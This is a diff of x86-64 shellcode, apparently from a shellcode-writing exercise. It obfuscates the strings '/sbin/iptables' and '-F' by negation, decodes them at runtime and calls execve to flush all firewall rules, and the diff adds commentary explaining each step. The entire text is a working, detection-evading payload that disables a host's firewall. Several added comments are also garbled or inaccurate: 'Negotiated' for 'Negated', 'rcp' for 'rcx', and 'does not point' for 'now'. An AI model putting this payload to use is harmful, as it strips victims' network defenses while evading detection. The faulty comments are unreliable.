@@ -20,26 +20,26 @@ _start:
     xor rax, rax
     cdq
     push rax
-    push word 0xb9d3 ; Obfuscated -F
-    mov rcx, rsp
+    push word 0xb9d3 ; Negotiated "-F"
+    mov rcx, rsp ; rcp has the deobfuscated string
     neg word [rcx] ; Deobfuscate -F
 
-    mov rbx,0xffff8c9a939d9e8c
+    mov rbx,0xffff8c9a939d9e8c ; Obfuscated part of /sbin/iptables
     push rbx
-    mov rbx,0x8f96d091969d8cd1
+    mov rbx,0x8f96d091969d8cd1 ; Obfuscated part of /sbin/iptables
     push rbx
-    mov rdi, rsp
+    mov rdi, rsp ; rdi does not point to the obfusctated string
 
-    neg qword [rsp]
+    neg qword [rsp]  ; Deobfuscate /sbin/iptables
     neg qword [rsp + 8] ; Deobfuscate /sbin/iptables
 
-    push rax
-    push rcx
-    push rdi
+    push rax ; Put a nullbyte on the stack
+    push rcx ; Put deobfuscated "-F" on stack
+    push rdi ; Put deobfuscated "/sbin/iptables" on stack
 
-    mov rsi, rsp
+    mov rsi, rsp ; rsi does now point to the first element of argv on the stack
 
-    mov al, 0x3b
+    mov al, 0x3b ; Finally call execve("/sbin/iptables", [ "/sbin/iptables", "-F", NULL ], 0)
     syscall
 
 ```
